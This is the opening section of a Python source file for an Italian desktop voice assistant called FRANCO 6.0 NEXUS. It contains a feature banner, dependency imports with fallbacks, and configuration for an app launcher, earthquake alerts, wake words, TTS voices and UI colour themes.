# --- FRANCO package bootstrap (added by split_franco.py) -----------
# The monolith historically imported sibling modules (franco_*.py) from
# its original directory. Keep them importable without moving 30 files.
import os as _os, sys as _sys
_LEGACY_HOME = _os.environ.get('FRANCO_LEGACY_HOME', r'E:\FRANCO\app')
if _os.path.isdir(_LEGACY_HOME) and _LEGACY_HOME not in _sys.path:
    _sys.path.insert(0, _LEGACY_HOME)
# --- end bootstrap -------------------------------------------------

"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                     F.R.A.N.C.O. 6.0 — NEXUS EDITION                        ║
║              Full Responsive Autonomous Neural Control Operator              ║
║                      Advanced Cybersecurity AI System                        ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  NOVITÀ v6.0 NEXUS:                                                          ║
║  ══════════════════                                                          ║
║  CORE SYSTEM:                                                                ║
║  • Architettura modulare completamente riscritta                             ║
║  • Sistema di plugin avanzato con hot-reload                                 ║
║  • Multi-threading ottimizzato con pool di worker                            ║
║  • Event-driven architecture con pub/sub pattern                             ║
║  • Caching intelligente con TTL e invalidazione                              ║
║  • Error recovery automatico con circuit breaker                             ║
║  • Logging strutturato con rotazione file                                    ║
║  • Configurazione YAML/JSON con validazione schema                           ║
║                                                                              ║
║  CYBERSECURITY MODULE:                                                       ║
║  • Network scanner integrato                                                 ║
║  • Port scanning e service detection                                         ║
║  • Vulnerability assessment base                                             ║
║  • Password strength analyzer                                                ║
║  • Hash cracker (dizionario)                                                 ║
║  • Network traffic monitor                                                   ║
║  • Firewall status checker                                                   ║
║  • SSL/TLS certificate analyzer                                              ║
║  • DNS lookup e reverse DNS                                                  ║
║  • Whois integration                                                         ║
║  • Shodan-style info gathering                                               ║
║  • Malware signature scanner base                                            ║
║                                                                              ║
║  AI & MACHINE LEARNING:                                                      ║
║  • Sentiment analysis locale                                                 ║
║  • Intent classification migliorato                                          ║
║  • Named Entity Recognition (NER)                                            ║
║  • Text summarization                                                        ║
║  • Code generation avanzata                                                  ║
║  • Anomaly detection per sicurezza                                           ║
║  • Pattern matching intelligente                                             ║
║  • Conversation context memory (lungo termine)                               ║
║                                                                              ║
║  AUTOMATION:                                                                 ║
║  • Task scheduler avanzato                                                   ║
║  • Workflow automation engine                                                ║
║  • Conditional triggers                                                      ║
║  • API integration framework                                                 ║
║  • Webhook support                                                           ║
║  • Batch processing                                                          ║
║  • File watcher con azioni automatiche                                       ║
║                                                                              ║
║  UI/UX:                                                                      ║
║  • Nuova UI holografica 3D                                                   ║
║  • Particle system avanzato                                                  ║
║  • Animazioni fluide 60fps                                                   ║
║  • Multi-window support                                                      ║
║  • Customizable dashboard                                                    ║
║  • Real-time graphs e charts                                                 ║
║  • Notification center                                                       ║
║  • Command palette (Ctrl+P)                                                  ║
║                                                                              ║
║  VOICE & AUDIO:                                                              ║
║  • Wake word detection migliorato                                            ║
║  • Voice biometrics (speaker identification)                                 ║
║  • Noise cancellation                                                        ║
║  • Multi-language support                                                    ║
║  • Emotion detection vocale                                                  ║
║  • Audio recording e playback                                                ║
║                                                                              ║
║  DATA & STORAGE:                                                             ║
║  • SQLite database per persistenza                                           ║
║  • Encrypted storage (Fernet)                                                ║
║  • Cloud sync ready                                                          ║
║  • Backup automatico incrementale                                            ║
║  • Data export (JSON, CSV, PDF)                                              ║
║                                                                              ║
║  NETWORKING:                                                                 ║
║  • REST API server integrato                                                 ║
║  • WebSocket support                                                         ║
║  • Remote control capability                                                 ║
║  • Proxy support                                                             ║
║  • VPN detection                                                             ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

# ==============================================================================
# METADATA
# ==============================================================================
__version__ = "6.0.0"
__codename__ = "NEXUS"
__author__ = "FRANCO AI Systems"
__license__ = "Proprietary"
__build_date__ = "2025"

# ==============================================================================
# STANDARD LIBRARY IMPORTS
# ==============================================================================
import os
import sys

# Carica le API key e le altre impostazioni da un file .env nella cartella
# dell'app (se presente) PRIMA di qualunque os.environ.get() piu' sotto —
# cosi' l'installazione non richiede di impostare variabili d'ambiente di
# sistema a mano. Del tutto opzionale: se python-dotenv non e' installato o
# il file .env non esiste, FRANCO funziona lo stesso leggendo le variabili
# d'ambiente reali (o va in fallback dove previsto).
try:
    from dotenv import load_dotenv as _load_dotenv
    from pathlib import Path as _Path
    _load_dotenv(_Path(__file__).resolve().parent / ".env")
except ImportError:
    pass

import io
import re
import json
import time
import math
import uuid
import wave
import struct
import shutil
import glob
import socket
import ssl
import hashlib
import base64
import secrets
import string
import zipfile
import tarfile
import gzip
import bz2
import lzma
import pickle
import shelve
import sqlite3
import csv
import xml.etree.ElementTree as ET
import html
import urllib.request
import urllib.parse
import urllib.error
import http.client
import http.server
import smtplib
import imaplib
import poplib
import ftplib   
import email
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.image import MIMEImage
from email.mime.audio import MIMEAudio
from email import encoders
from email.utils import formatdate, make_msgid
import mimetypes
import tempfile
import platform
import ctypes
import subprocess
import threading
import multiprocessing
import concurrent.futures
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
import queue
import asyncio
import signal
import atexit
import traceback
import logging
import logging.handlers
import warnings
import inspect
import functools
from functools import lru_cache, wraps, partial
import itertools
from itertools import chain, cycle, islice
import collections
from collections import defaultdict, deque, OrderedDict, Counter, namedtuple
import heapq
import bisect
import array
import copy
import weakref
import gc

if sys.platform != 'win32':
    import fcntl
import locale
import getpass
import textwrap
import difflib
import unicodedata
import codecs
import configparser
import argparse
import pathlib
from pathlib import Path
from datetime import datetime, timedelta, timezone
from typing import (
    Any, Dict, List, Tuple, Optional, Union, Callable, 
    TypeVar, Generic, Iterable, Iterator, Generator,
    Set, FrozenSet, Sequence, Mapping, MutableMapping,
    Type, ClassVar, Final, Literal, Protocol, runtime_checkable
)
from dataclasses import dataclass, field, asdict, astuple
from abc import ABC, abstractmethod
from enum import Enum, IntEnum, Flag, auto
from contextlib import contextmanager, asynccontextmanager, suppress
import random
import statistics
import colorsys
import webbrowser
import calendar
import zlib
import binascii
import hmac
import fnmatch
import filecmp
from .orb_voice import XTTSService, wav_envelope
from .orb_ui import OrbExperience
from .franco_code import FrancoCode
from .spotify_adapter import SpotifyAdapter
from .live_canvas import LiveCanvas
import shlex
import gettext
import numbers
from decimal import Decimal, getcontext
from fractions import Fraction
try:
    from franco_patch_dual_ai import (
           MistralAIClient, DualAIRouter, RealFileSaver, patch_command_engine
       )
    from franco_code_agent import patch_code_agent
except ImportError:
    MistralAIClient = None
    DualAIRouter = None
    RealFileSaver = None
    def patch_command_engine(*args, **kwargs):
        return None
    def patch_code_agent(*args, **kwargs):
        return None

# ==============================================================================
# CONFIGURAZIONE MODULI EXTRA — APP LAUNCHER, TERREMOTI, MOBILE
# ==============================================================================

EXTRAS_CONFIG = {
    "apps": {
        "cache_ttl_hours": 24,
        "scan_paths": [
            r"C:\Program Files",
            r"C:\Program Files (x86)",
            r"%LOCALAPPDATA%\Programs",
            r"%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs",
            r"%APPDATA%\Microsoft\Windows\Start Menu\Programs",
        ],
        "custom_aliases": {
            "chrome": ["google chrome", "browser google"],
            "spotify": ["musica", "spoti"],
            "code": ["vs code", "vscode", "visual studio code"],
            "msedge": ["edge", "microsoft edge"],
            "firefox": ["mozilla", "mozilla firefox"],
            "winword": ["word", "microsoft word"],
            "excel": ["microsoft excel", "foglio calcolo"],
            "powerpnt": ["powerpoint", "microsoft powerpoint"],
            "notepad++": ["notepad plus plus", "npp"],
        },
        "manual_paths": {
            # Esempio: aggiungi qui app che non vengono trovate
            # "photoshop": r"C:\Program Files\Adobe\Photoshop\Photoshop.exe",
        },
    },
    "earthquake": {
        "enabled": True,
        "poll_seconds": 30,
        "home_lat": 41.9028,    # Roma — CAMBIA con le tue coordinate
        "home_lon": 12.4964,
        "min_magnitude": 3.5,
        "max_distance_km": 600,
        "quiet_hours": "23:30-07:00",
        "siren_volume": 0.9,
        "feeds": [
            {"name": "INGV",
             "url": "[webservices.ingv.it](https://webservices.ingv.it/fdsnws/event/1/query?format=geojson&orderby=time&limit=30&minmag=2.5)"},
            {"name": "EMSC",
             "url": "[seismicportal.eu](https://www.seismicportal.eu/fdsnws/event/1/query?format=json&limit=30&minmag=3)"},
        ],
        "notify": {
            "ntfy": {
                "enabled": True,
                "server": "[ntfy.sh](https://ntfy.sh)",
                "topic": "LEO_TERREMOTI",
            },
            "telegram": {
                "enabled": False,
                "bot_token": "",
                "chat_id": "",
            },
        },
    },
    "mobile": {
        "enabled": True,
        "host": "0.0.0.0",
        "port": 8765,
        # Nessuna chiave hardcoded: MobileBridge ne genera una sicura al primo
        # avvio (o legge FRANCO_MOBILE_API_KEY dall'ambiente) — vedi
        # MobileBridge._resolve_api_keys().
        "api_keys": [],
    },
}

DATA_DIR = Path(__file__).resolve().parent / "data"
DATA_DIR.mkdir(parents=True, exist_ok=True)

EQ_SEEN_FILE = DATA_DIR / "eq_seen.json"
APP_INDEX_FILE = DATA_DIR / "app_index.json"

# ==============================================================================
# WINDOWS-SPECIFIC IMPORTS
# ==============================================================================
if sys.platform == 'win32':
    import ctypes.wintypes
    import winreg
    import msvcrt
    
    # Windows API constants
    PROCESS_QUERY_INFORMATION = 0x0400
    PROCESS_VM_READ = 0x0010
    TOKEN_QUERY = 0x0008
    TOKEN_ADJUST_PRIVILEGES = 0x0020
    SE_PRIVILEGE_ENABLED = 0x00000002

# ==============================================================================
# THIRD-PARTY IMPORTS CON FALLBACK
# ==============================================================================
DEPENDENCIES_STATUS = {}

# Speech Recognition
try:
    import speech_recognition as sr
    DEPENDENCIES_STATUS['speech_recognition'] = True
except ImportError:
    DEPENDENCIES_STATUS['speech_recognition'] = False
    sr = None

# Anthropic Claude API
try:
    import anthropic
    DEPENDENCIES_STATUS['anthropic'] = True
except ImportError:
    DEPENDENCIES_STATUS['anthropic'] = False
    anthropic = None

# OpenAI Text-to-Speech (opzionale; richiede OPENAI_API_KEY nell'ambiente)
try:
    from openai import OpenAI
    DEPENDENCIES_STATUS['openai'] = True
except ImportError:
    DEPENDENCIES_STATUS['openai'] = False
    OpenAI = None

# Text-to-Speech — import con timeout (può bloccarsi su certi sistemi)
def _timed_import(name, alias=None, timeout=6):
    """Esegue un import in un thread separato con timeout per evitare blocchi."""
    import threading
    result = [None]
    exc = [None]
    def _do():
        try:
            import importlib
            result[0] = importlib.import_module(name)
        except Exception as e:
            exc[0] = e
    t = threading.Thread(target=_do, daemon=True)
    t.start()
    t.join(timeout)
    if t.is_alive():
        return None  # timeout → modulo non disponibile
    if exc[0]:
        return None
    return result[0]

edge_tts = _timed_import("edge_tts")
DEPENDENCIES_STATUS['edge_tts'] = edge_tts is not None

# Audio processing
try:
    import pyaudio
    DEPENDENCIES_STATUS['pyaudio'] = True
except ImportError:
    DEPENDENCIES_STATUS['pyaudio'] = False
    pyaudio = None

sd = _timed_import("sounddevice")
DEPENDENCIES_STATUS['sounddevice'] = sd is not None
if sd is not None:
    import sys as _sys
    _sys.modules['sounddevice'] = sd

try:
    import soundfile as sf
    DEPENDENCIES_STATUS['soundfile'] = True
except ImportError:
    DEPENDENCIES_STATUS['soundfile'] = False
    sf = None

# Numerical computing
try:
    import numpy as np
    DEPENDENCIES_STATUS['numpy'] = True
except ImportError:
    DEPENDENCIES_STATUS['numpy'] = False
    np = None

try:
    import scipy
    from scipy import signal as scipy_signal
    from scipy import stats as scipy_stats
    from scipy import ndimage
    DEPENDENCIES_STATUS['scipy'] = True
except ImportError:
    DEPENDENCIES_STATUS['scipy'] = False
    scipy = None
    scipy_signal = None
    scipy_stats = None
    ndimage = None

# System monitoring
try:
    import psutil
    DEPENDENCIES_STATUS['psutil'] = True
except ImportError:
    DEPENDENCIES_STATUS['psutil'] = False
    psutil = None

# GUI automation
try:
    import pyautogui
    pyautogui.FAILSAFE = True
    pyautogui.PAUSE = 0.03
    DEPENDENCIES_STATUS['pyautogui'] = True
except ImportError:
    DEPENDENCIES_STATUS['pyautogui'] = False
    pyautogui = None

# Image processing
try:
    from PIL import Image, ImageGrab, ImageDraw, ImageFont, ImageFilter
    from PIL import ImageEnhance, ImageOps, ImageChops, ImageStat
    DEPENDENCIES_STATUS['pillow'] = True
except ImportError:
    DEPENDENCIES_STATUS['pillow'] = False
    Image = None
    ImageGrab = None
    ImageDraw = None
    ImageFont = None
    ImageFilter = None
    ImageEnhance = None
    ImageOps = None
    ImageChops = None
    ImageStat = None

# Clipboard
try:
    import pyperclip
    DEPENDENCIES_STATUS['pyperclip'] = True
except ImportError:
    DEPENDENCIES_STATUS['pyperclip'] = False
    pyperclip = None

# HTTP requests
try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    DEPENDENCIES_STATUS['requests'] = True
except ImportError:
    DEPENDENCIES_STATUS['requests'] = False
    requests = None
    HTTPAdapter = None
    Retry = None

# Window management
try:
    import pygetwindow as gw
    DEPENDENCIES_STATUS['pygetwindow'] = True
except ImportError:
    DEPENDENCIES_STATUS['pygetwindow'] = False
    gw = None

# QR Code
try:
    import qrcode
    from qrcode.constants import ERROR_CORRECT_L, ERROR_CORRECT_M, ERROR_CORRECT_Q, ERROR_CORRECT_H
    DEPENDENCIES_STATUS['qrcode'] = True
except ImportError:
    DEPENDENCIES_STATUS['qrcode'] = False
    qrcode = None

# Cryptography
try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa, padding
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.backends import default_backend
    from cryptography.x509 import load_pem_x509_certificate, load_der_x509_certificate
    DEPENDENCIES_STATUS['cryptography'] = True
except ImportError:
    DEPENDENCIES_STATUS['cryptography'] = False
    Fernet = None

# WHOIS lookup
try:
    import whois
    DEPENDENCIES_STATUS['python-whois'] = True
except ImportError:
    DEPENDENCIES_STATUS['python-whois'] = False
    whois = None

# Pygame for UI
try:
    import pygame
    from pygame import gfxdraw
    DEPENDENCIES_STATUS['pygame'] = True
except ImportError:
    DEPENDENCIES_STATUS['pygame'] = False
    pygame = None
    gfxdraw = None

# Keyboard hooks
try:
    import keyboard
    DEPENDENCIES_STATUS['keyboard'] = True
except ImportError:
    DEPENDENCIES_STATUS['keyboard'] = False
    keyboard = None

# Mouse hooks
try:
    import mouse
    DEPENDENCIES_STATUS['mouse'] = True
except ImportError:
    DEPENDENCIES_STATUS['mouse'] = False
    mouse = None

# YAML parsing
try:
    import yaml
    DEPENDENCIES_STATUS['pyyaml'] = True
except ImportError:
    DEPENDENCIES_STATUS['pyyaml'] = False
    yaml = None

# Beautiful Soup for web scraping
try:
    from bs4 import BeautifulSoup
    DEPENDENCIES_STATUS['beautifulsoup4'] = True
except ImportError:
    DEPENDENCIES_STATUS['beautifulsoup4'] = False
    BeautifulSoup = None

# Selenium for web automation
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.common.keys import Keys
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    DEPENDENCIES_STATUS['selenium'] = True
except ImportError:
    DEPENDENCIES_STATUS['selenium'] = False
    webdriver = None

# Scikit-learn for ML — import con timeout (lento all'avvio su certi sistemi)
def _sklearn_import():
    try:
        from sklearn.feature_extraction.text import TfidfVectorizer, CountVectorizer
        from sklearn.naive_bayes import MultinomialNB
        from sklearn.linear_model import LogisticRegression
        from sklearn.ensemble import RandomForestClassifier, IsolationForest
        from sklearn.cluster import KMeans, DBSCAN
        from sklearn.metrics.pairwise import cosine_similarity
        from sklearn.preprocessing import StandardScaler, LabelEncoder
        from sklearn.model_selection import train_test_split
        return (TfidfVectorizer, CountVectorizer, MultinomialNB, LogisticRegression,
                RandomForestClassifier, IsolationForest, KMeans, DBSCAN,
                cosine_similarity, StandardScaler, LabelEncoder, train_test_split)
    except Exception:
        return None

_sk = _timed_import.__func__.__globals__.get('_timed_import') if False else None

import threading as _threading_sk
_sk_result = [None]
def _sk_thread():
    _sk_result[0] = _sklearn_import()
_t_sk = _threading_sk.Thread(target=_sk_thread, daemon=True)
_t_sk.start()
_t_sk.join(8)

if _t_sk.is_alive() or _sk_result[0] is None:
    DEPENDENCIES_STATUS['sklearn'] = False
    TfidfVectorizer = CountVectorizer = MultinomialNB = LogisticRegression = None
    RandomForestClassifier = IsolationForest = KMeans = DBSCAN = None
    cosine_similarity = StandardScaler = LabelEncoder = train_test_split = None
else:
    DEPENDENCIES_STATUS['sklearn'] = True
    (TfidfVectorizer, CountVectorizer, MultinomialNB, LogisticRegression,
     RandomForestClassifier, IsolationForest, KMeans, DBSCAN,
     cosine_similarity, StandardScaler, LabelEncoder, train_test_split) = _sk_result[0]

# Natural Language Toolkit
try:
    import nltk
    from nltk.tokenize import word_tokenize, sent_tokenize
    from nltk.corpus import stopwords
    from nltk.stem import WordNetLemmatizer, PorterStemmer
    DEPENDENCIES_STATUS['nltk'] = True
except ImportError:
    DEPENDENCIES_STATUS['nltk'] = False
    nltk = None

# Pandas for data manipulation
try:
    import pandas as pd
    DEPENDENCIES_STATUS['pandas'] = True
except ImportError:
    DEPENDENCIES_STATUS['pandas'] = False
    pd = None

# Matplotlib for charts
try:
    import matplotlib
    matplotlib.use('Agg')  # Non-interactive backend
    import matplotlib.pyplot as plt
    from matplotlib.figure import Figure
    from matplotlib.backends.backend_agg import FigureCanvasAgg
    DEPENDENCIES_STATUS['matplotlib'] = True
except ImportError:
    DEPENDENCIES_STATUS['matplotlib'] = False
    plt = None

# Network scanning
try:
    import scapy.all as scapy
    DEPENDENCIES_STATUS['scapy'] = True
except ImportError:
    DEPENDENCIES_STATUS['scapy'] = False
    scapy = None

# ==============================================================================
# CONFIGURATION CONSTANTS
# ==============================================================================

# API Configuration
API_KEY_CLAUDE = os.environ.get('CLAUDE_API_KEY', '')  # Set CLAUDE_API_KEY env var

# Directory Structure
BASE_DIR = Path(__file__).parent.resolve()
DATA_DIR = BASE_DIR / "franco_data"
LOGS_DIR = DATA_DIR / "logs"
CACHE_DIR = DATA_DIR / "cache"
TEMP_DIR = DATA_DIR / "temp"
AUDIO_DIR = DATA_DIR / "audio"
SCREENSHOTS_DIR = DATA_DIR / "screenshots"
PROJECTS_DIR = DATA_DIR / "projects"
PLUGINS_DIR = DATA_DIR / "plugins"
BACKUP_DIR = DATA_DIR / "backups"
MODELS_DIR = DATA_DIR / "models"
CONFIG_DIR = DATA_DIR / "config"
DATABASE_DIR = DATA_DIR / "database"
EXPORTS_DIR = DATA_DIR / "exports"
DOWNLOADS_DIR = Path.home() / "Downloads"
DESKTOP_DIR = Path.home() / "Desktop"
DOCUMENTS_DIR = Path.home() / "Documents"

# Create all directories
ALL_DIRECTORIES = [
    DATA_DIR, LOGS_DIR, CACHE_DIR, TEMP_DIR, AUDIO_DIR,
    SCREENSHOTS_DIR, PROJECTS_DIR, PLUGINS_DIR, BACKUP_DIR,
    MODELS_DIR, CONFIG_DIR, DATABASE_DIR, EXPORTS_DIR
]

for directory in ALL_DIRECTORIES:
    directory.mkdir(parents=True, exist_ok=True)

# File paths
MAIN_DATABASE = DATABASE_DIR / "franco.db"
MEMORY_FILE = DATA_DIR / "memoria_franco.json"
CONFIG_FILE = CONFIG_DIR / "config.yaml"
EMAIL_CONFIG_FILE = CONFIG_DIR / "email_config.json"
MACRO_FILE = DATA_DIR / "macros.json"
VAULT_FILE = DATA_DIR / "vault.enc"
VAULT_KEY_FILE = DATA_DIR / ".vault_key"
WORKFLOW_FILE = DATA_DIR / "workflows.json"
SCHEDULER_FILE = DATA_DIR / "scheduler.json"
LOG_FILE = LOGS_DIR / "franco.log"

# System Information
SYSTEM_PLATFORM = platform.system()
SYSTEM_RELEASE = platform.release()
SYSTEM_VERSION = platform.version()
SYSTEM_MACHINE = platform.machine()
SYSTEM_PROCESSOR = platform.processor()
PYTHON_VERSION = platform.python_version()
IS_WINDOWS = SYSTEM_PLATFORM == "Windows"
IS_MACOS = SYSTEM_PLATFORM == "Darwin"
IS_LINUX = SYSTEM_PLATFORM == "Linux"

# Audio Configuration
AUDIO_SAMPLE_RATE = 16000
AUDIO_CHANNELS = 1
AUDIO_CHUNK_SIZE = 1024
AUDIO_FORMAT = pyaudio.paInt16 if pyaudio else None

# Voice Activity Detection
VAD_SILENCE_THRESHOLD = float(os.environ.get("FRANCO_VAD_FINAL_SILENCE", "2.2"))
VAD_MIN_SPEECH_DURATION = float(os.environ.get("FRANCO_VAD_MIN_SPEECH", "0.35"))
VAD_MAX_PHRASE_DURATION = float(os.environ.get("FRANCO_VAD_MAX_PHRASE", "40"))
VAD_ENERGY_MULTIPLIER = 1.8
CLAP_DETECTION_THRESHOLD = 65
CLAP_COOLDOWN = 0.5

# Finestra di conversazione (secondi): dopo "ehi Franco" o dopo una sua
# risposta, i comandi successivi NON richiedono di ripetere la wake word.
# Scaduta la finestra, torna obbligatoria (per non rispondere ai rumori).
CONVERSATION_FOLLOWUP_WINDOW = 30.0

# Wake Words — deliberatamente ristrette a "ehi franco" e varianti dirette
# (non parole generiche come "computer"/"sistema"/"franco" da sole): con
# quelle, una normale conversazione in stanza rischiava di svegliare FRANCO
# per sbaglio.
WAKE_WORDS = [
    # forme complete ("ehi Franco" e varianti che Google STT produce davvero)
    "ehi franco", "hey franco", "ei franco", "e franco", "a franco",
    "oh franco", "ho franco", "ok franco", "okay franco",
    "ehi frank", "hey frank",
    "ehi jarvis", "hey jarvis", "ok jarvis", "ei jarvis",
    # WAKE WORD SINGOLA: basta dire "Franco" (o "Jarvis") — è ciò che l'utente
    # si aspetta. Google a volte sente "franko"/"francho"/"franca": le copriamo.
    "franco", "jarvis", "franko", "francho", "franca",
]

# Network Configuration
DEFAULT_TIMEOUT = 10
MAX_RETRIES = 3
RETRY_BACKOFF = 0.5
USER_AGENT = f"FRANCO/{__version__} ({SYSTEM_PLATFORM}; {SYSTEM_MACHINE})"

# Security Configuration
PASSWORD_MIN_LENGTH = 8
PASSWORD_HASH_ITERATIONS = 100000
SESSION_TIMEOUT = 3600
MAX_LOGIN_ATTEMPTS = 5
LOCKOUT_DURATION = 300

# Cache Configuration
CACHE_DEFAULT_TTL = 3600
CACHE_MAX_SIZE = 1000
CACHE_CLEANUP_INTERVAL = 600

# UI Configuration
UI_WIDTH = 1200
UI_HEIGHT = 800
UI_FPS = 60
UI_PARTICLE_COUNT = 80
UI_SPHERE_POINTS = 1000

# Color Themes
THEMES = {
    "nexus": {
        "name": "Nexus",
        "primary": (0, 200, 255),
        "secondary": (0, 120, 180),
        "accent": (0, 255, 200),
        "warning": (255, 180, 0),
        "danger": (255, 60, 60),
        "success": (0, 255, 100),
        "info": (100, 180, 255),
        "bg_dark": (2, 6, 14),
        "bg_medium": (8, 18, 32),
        "bg_light": (15, 30, 50),
        "panel": (0, 15, 30),
        "text_primary": (220, 240, 255),
        "text_secondary": (150, 180, 210),
        "text_dim": (80, 110, 140),
        "border": (0, 80, 120),
        "glow": (0, 180, 255),
    },
    "amber": {
        "name": "Amber",
        "primary": (255, 180, 0),
        "secondary": (200, 120, 0),
        "accent": (255, 220, 80),
        "warning": (255, 100, 0),
        "danger": (255, 40, 40),
        "success": (180, 255, 0),
        "info": (255, 200, 100),
        "bg_dark": (10, 6, 0),
        "bg_medium": (20, 14, 4),
        "bg_light": (30, 22, 8),
        "panel": (20, 12, 0),
        "text_primary": (255, 230, 180),
        "text_secondary": (220, 180, 120),
        "text_dim": (140, 100, 50),
        "border": (120, 80, 0),
        "glow": (255, 160, 0),
    },
    "matrix": {
        "name": "Matrix",
        "primary": (0, 255, 65),
        "secondary": (0, 180, 45),
        "accent": (100, 255, 140),
        "warning": (200, 255, 0),
        "danger": (255, 60, 60),
        "success": (0, 255, 100),
        "info": (80, 255, 120),
        "bg_dark": (0, 8, 2),
        "bg_medium": (0, 15, 5),
        "bg_light": (0, 24, 8),
        "panel": (0, 12, 4),
        "text_primary": (150, 255, 180),
        "text_secondary": (100, 220, 140),
        "text_dim": (40, 120, 60),
        "border": (0, 100, 30),
        "glow": (0, 255, 65),
    },
    "crimson": {
        "name": "Crimson",
        "primary": (255, 60, 80),
        "secondary": (180, 40, 60),
        "accent": (255, 120, 140),
        "warning": (255, 180, 0),
        "danger": (255, 0, 40),
        "success": (100, 255, 150),
        "info": (255, 150, 170),
        "bg_dark": (12, 2, 4),
        "bg_medium": (22, 6, 10),
        "bg_light": (35, 12, 18),
        "panel": (18, 4, 8),
        "text_primary": (255, 200, 210),
        "text_secondary": (220, 150, 160),
        "text_dim": (120, 60, 70),
        "border": (120, 30, 45),
        "glow": (255, 60, 80),
    },
    "phantom": {
        "name": "Phantom",
        "primary": (180, 100, 255),
        "secondary": (120, 60, 180),
        "accent": (220, 160, 255),
        "warning": (255, 200, 100),
        "danger": (255, 80, 100),
        "success": (120, 255, 180),
        "info": (200, 150, 255),
        "bg_dark": (8, 4, 14),
        "bg_medium": (16, 10, 26),
        "bg_light": (26, 18, 40),
        "panel": (12, 6, 22),
        "text_primary": (230, 210, 255),
        "text_secondary": (180, 160, 210),
        "text_dim": (100, 80, 130),
        "border": (80, 50, 120),
        "glow": (180, 100, 255),
    },
    "stealth": {
        "name": "Stealth",
        "primary": (120, 130, 140),
        "secondary": (80, 90, 100),
        "accent": (160, 170, 180),
        "warning": (200, 180, 100),
        "danger": (200, 80, 80),
        "success": (100, 180, 120),
        "info": (140, 160, 180),
        "bg_dark": (8, 10, 12),
        "bg_medium": (16, 20, 24),
        "bg_light": (28, 34, 40),
        "panel": (12, 15, 18),
        "text_primary": (200, 210, 220),
        "text_secondary": (150, 160, 170),
        "text_dim": (80, 90, 100),
        "border": (60, 70, 80),
        "glow": (140, 150, 160),
    },
}

# Active theme
ACTIVE_THEME = "nexus"

# Voce ElevenLabs scelta dall'utente: "Roger" (premade, inclusa nel piano
# gratuito, utilizzabile via API senza upgrade — a differenza delle voci
# della Voice Library condivisa). Non e' un segreto (e' solo un ID voce,
# non una chiave API), a differenza della chiave che resta SOLO in
# ELEVENLABS_API_KEY (variabile d'ambiente, mai hardcodata).
ELEVENLABS_VOICE_ID = "CwhRBWXzGAHq8TQ4Fs17"

# TTS Voices
TTS_VOICES = {
    # Voce OpenAI maschile. Senza chiave API, il programma usa Diego come fallback.
    "onyx": "onyx",
    "diego": "it-IT-DiegoNeural",
    "elsa": "it-IT-ElsaNeural",
    "isabella": "it-IT-IsabellaNeural",
    "giuseppe": "it-IT-GiuseppeNeural",
    "benigno": "it-IT-BenignoNeural",
    "calimero": "it-IT-CalimeroNeural",
    "cataldo": "it-IT-CataldoNeural",
    "fabiola": "it-IT-FabiolaNeural",
    "fiamma": "it-IT-FiammaNeural",
    "gianni": "it-IT-GianniNeural",
    "imelda": "it-IT-ImeldaNeural",
    "irma": "it-IT-IrmaNeural",
    "lisandro": "it-IT-LisandroNeural",
    "palmira": "it-IT-PalmiraNeural",
    "pierina": "it-IT-PierinaNeural",
    "rinaldo": "it-IT-RinaldoNeural",
}

# Application database for fuzzy matching
APP_DATABASE = {
    # Windows System Apps
    "blocco note": {"cmd": "notepad", "aliases": ["notepad", "note", "testo"]},
    "calcolatrice": {"cmd": "calc", "aliases": ["calc", "calculator", "calcola"]},
    "paint": {"cmd": "mspaint", "aliases": ["disegno", "pittura"]},
    "esplora risorse": {"cmd": "explorer", "aliases": ["explorer", "file", "risorse"]},
    "task manager": {"cmd": "taskmgr", "aliases": ["gestione attività", "processi", "task"]},
    "impostazioni": {"cmd": "ms-settings:", "aliases": ["settings", "opzioni"]},
    "cmd": {"cmd": "cmd", "aliases": ["prompt", "dos", "terminale cmd"]},
    "powershell": {"cmd": "powershell", "aliases": ["ps", "shell"]},
    "terminal": {"cmd": "wt", "aliases": ["windows terminal", "wt"]},
    "registro": {"cmd": "regedit", "aliases": ["regedit", "registro di sistema"]},
    "servizi": {"cmd": "services.msc", "aliases": ["services"]},
    "gestione disco": {"cmd": "diskmgmt.msc", "aliases": ["disk", "dischi"]},
    "gestione dispositivi": {"cmd": "devmgmt.msc", "aliases": ["devices", "dispositivi"]},
    "pulizia disco": {"cmd": "cleanmgr", "aliases": ["cleanup", "pulizia"]},
    "informazioni sistema": {"cmd": "msinfo32", "aliases": ["sysinfo", "info sistema"]},
    "pannello di controllo": {"cmd": "control", "aliases": ["control panel", "pannello"]},
    
    # Microsoft Office
    "word": {"cmd": "winword", "aliases": ["microsoft word", "documento"]},
    "excel": {"cmd": "excel", "aliases": ["microsoft excel", "foglio di calcolo", "spreadsheet"]},
    "powerpoint": {"cmd": "powerpnt", "aliases": ["microsoft powerpoint", "presentazione", "slide"]},
    "outlook": {"cmd": "outlook", "aliases": ["microsoft outlook", "posta"]},
    "onenote": {"cmd": "onenote", "aliases": ["microsoft onenote", "note digitali"]},
    "teams": {"cmd": "teams", "aliases": ["microsoft teams", "riunioni"]},
    "access": {"cmd": "msaccess", "aliases": ["microsoft access", "database access"]},
    
    # Browsers
    "chrome": {"cmd": "chrome", "aliases": ["google chrome", "browser google"]},
    "firefox": {"cmd": "firefox", "aliases": ["mozilla firefox", "mozilla"]},
    "edge": {"cmd": "msedge", "aliases": ["microsoft edge", "edge browser"]},
    "opera": {"cmd": "opera", "aliases": ["opera browser"]},
    "brave": {"cmd": "brave", "aliases": ["brave browser"]},
    "vivaldi": {"cmd": "vivaldi", "aliases": ["vivaldi browser"]},
    
    # Communication
    "discord": {"cmd": "discord", "aliases": ["disc"]},
    "telegram": {"cmd": "telegram", "aliases": ["tg"]},
    "whatsapp": {"cmd": "whatsapp", "aliases": ["wa", "whats app"]},
